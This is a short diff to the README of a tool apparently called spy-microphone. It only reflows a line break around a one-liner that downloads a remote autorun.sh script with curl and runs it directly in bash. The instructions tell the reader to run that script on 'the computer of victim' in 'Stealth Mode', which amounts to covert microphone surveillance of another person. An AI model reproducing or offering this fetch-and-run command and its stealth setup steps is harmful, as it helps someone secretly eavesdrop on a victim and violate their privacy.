@@ -1,7 +1,8 @@
 
    For use spy-microphone please follow instructions <br><br>
 
-   Easy remote command for spy:  bash <(curl -s https://raw.githubusercontent.com/makdosx/spy-microphone/master/shell/autorun.sh) <br><br>
+   Easy remote command for spy: <br>
+   bash <(curl -s https://raw.githubusercontent.com/makdosx/spy-microphone/master/shell/autorun.sh) <br><br>
 
     i) Run the file autorun.sh in  the computer of victim and set your params 
        Stealth Mode <br>
